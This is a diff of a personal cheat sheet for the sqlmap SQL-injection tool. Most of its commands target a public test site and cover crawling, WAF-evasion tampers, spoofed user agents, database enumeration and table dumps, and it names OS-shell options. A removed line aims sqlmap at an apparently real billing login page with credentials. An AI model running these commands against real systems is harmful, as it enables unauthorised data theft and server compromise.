@@ -1,7 +1,67 @@
 
-method:1
 
-python3 sqlmap.py -u "https://billing.dotinternetbd.com/login" --data="email=admin@dotinternetbd.com&password=P@$$w0rD"  
---level 5 --risk 3 -f --banner --ignore-code 401 --dbms='sqlite' --technique=B --flush
+# Technique:
+	
+	B : boolean based blind
+	E : error based 
+	U : union query based
+	S : stacked quires
+	T : time based blind
+	Q : inline quries
+	
 
+# Crawl:
+ 	
+	sqlmap -u http://testphp.vulnweb.com/  --crawl 3						|| allow to scan sub-directories
+	sqlmap -u http://testphp.vulnweb.com/  --crawl 3 --batch 				|| batch allow for implicit YES for all queries
+	sqlmap -u http://testphp.vulnweb.com/  --crawl 3 --technique="U" --batch 	
+	sqlmap -u http://testphp.vulnweb.com/  --crawl 3 --threads 5 --batch 	|| default thread is 1, 5 means high scanning
+	sqlmap -u http://testphp.vulnweb.com/  --crawl 3 --risk 3 	 --batch 	|| 3 for aggresive/offensice payload, default is 1, is regular scan
+	sqlmap -u http://testphp.vulnweb.com/  --crawl 3 --risk 3 	 --batch	|| inspect deep like cookie, user-agent, range is 1-5, false positive possible
+	
+	sqlmap -u http://testphp.vulnweb.com/	--crawl 3 --output-dir="root/results" 		--batch			|| stored logs
+	sqlmap -u http://testphp.vulnweb.com/	--crawl 3 --headers="Referer:facebook.com" 	-v 4 			|| add header to modify header payload
+
+	sqlmap -u http://testphp.vulnweb.com/	--crawl 3 --user-agent="GECKO_Chrome" -v 4 	--batch			|| customer user-agent, if WAF dropped for bypass
+	sqlmap -u http://testphp.vulnweb.com/	--crawl 3 --mobile 					  -v 4 	--batch			|| mobile user-agent
+	sqlmap -u http://testphp.vulnweb.com/	--crawl 3 --random-agent
+
+
+	sqlmap	--list-tampers
+	sqlmap -u http://testphp.vulnweb.com/	--crawl 3 --tamper=base64encode -v 3 --batch				|| base64encode wrapping payload, waf cant dropp
+	sqlmap -u http://testphp.vulnweb.com/	--crawl 3 --proxy="127.0.0.1:8080"							|| brup suite proxy
+
+	sqlmap -u http://testphp.vulnweb.com/login.php	--forms
+	sqlmap -u http://testphp.vulnweb.com/login.php	--data="uname=admin@pass=pass&login=submit" --dbs
+				
+	
+ # Verbosity:
+ 
+	0 : show only python tracbaks, error and critical msgs
+	1 : show information and warning msgs
+	2 : show debug msgs
+	3 : show payload injected
+	4 : show http request
+	5 : show http request header
+	6 : show http response page content 
+	
+	sqlmap -u http://testphp.vulnweb.com/  --crawl 3 -v 4/5/6  --batch	
+	
+	
+	
+ # Enumerate:
+	
+	sqlmap -u http://testphp.vulnweb.com/products.php?id=1  --current-user --current-db --hostname --batch		|| after getting vulnerable links
+	sqlmap -u http://testphp.vulnweb.com/products.php?id=1  --dbs		
+	sqlmap -u http://testphp.vulnweb.com/products.php?id=1  -D bankdb -T users	--dump							|| dumping only users table
+	sqlmap -u http://testphp.vulnweb.com/products.php?id=1  -D bankdb --dump-all								|| dumming all tables
+	sqlmap -u http://testphp.vulnweb.com/products.php?id=1  -D bankdb -T users	--columns						|| show users table type
+
+
+
+ # Highlight:
+	
+	--cookie, --flush-session, --comment, --os-shell, --os-command
+	
+	
 
